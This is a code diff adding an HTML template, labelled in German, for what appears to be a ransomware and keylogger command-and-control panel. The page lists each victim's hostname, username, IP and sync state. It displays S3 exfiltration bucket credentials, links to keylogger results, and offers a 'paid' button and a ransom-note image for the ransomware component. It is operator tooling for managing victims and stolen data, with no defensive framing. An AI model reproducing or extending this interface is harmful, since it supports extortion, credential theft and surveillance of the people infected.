@@ -1,0 +1,50 @@
+{% extends "layout.html" %}
+{% block content %}
+<h2 class="text-center">Details zu Opfer {{victim.victim_hostname}}</h2>
+<hr>
+
+<div class="row m-2">
+    <div class="card col-sm-12">
+        <div class="card-body mx-auto text-left">
+            <h5 class="card-title text-center"><b>Opfer {{victim.victim_hostname}}</b></h5>
+            <hr>
+            <p class="card-text">
+            <h6><b>ID:</b> {{victim.victim_id}}</h6>
+            <h6><b>Username:</b> {{victim.victim_username}}</h6>
+            <h6><b>Erstkontakt:</b> {{victim.date_firstContact}}</h6>
+            <h6><b>Letzte IP:</b> {{victim.ip_firstContact}}</h6>
+            <h6><b>Sync-Status:</b> {{victim.sync_state}}</h6>
+            <div class="text-center">
+                <a href="/sync/{{victim.victim_id}}/set/0"><button type="button" class="btn btn-danger">0</button></a>
+                <a href="/sync/{{victim.victim_id}}/set/1"><button type="button" class="btn btn-danger">1</button></a>
+                <a href="/sync/{{victim.victim_id}}/set/2"><button type="button" class="btn btn-danger">2</button></a>
+                <a href="/sync/{{victim.victim_id}}/set/3"><button type="button" class="btn btn-danger">3</button></a>
+            </div>
+
+            <hr>
+            <div>
+                <h4>Exfiltration</h4>
+                <div class="alert alert-dark" role="alert">
+                    <h6><b>S3 Bucket</b>: {{victim.s3_bucket}}</h6>
+                    <h6><b>S3 Access Key</b> : {{victim.s3_access_key}}</h6>
+                    <h6><b>S3 Secret Key</b> : {{victim.s3_secret_key}}</h6>
+                    <h6><b>Zugriff</b> : <a href="https://s3.uber.space">Link</a> </h6>
+                </div>
+                <h4>Keylogger</h4>
+                <div class="alert alert-dark text-center" role="alert">
+                    <a href="/paymentReceived/{{victim.victim_id}}"><button type="button"
+                            class="btn btn-dark">Ergebnisse</button></a>
+                </div>
+                <h4>Ransomeware</h4>
+                <div class="alert alert-dark text-center" role="alert">
+                    <a href="/paymentReceived/{{victim.victim_id}}"><button type="button"
+                            class="btn btn-dark">Bezahlt!</button></a>
+                    <a href="/static/wp/{{victim.victim_id}}.png"><button type="button"
+                            class="btn btn-dark">Ransomnotiz</button></a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+{% endblock content %}
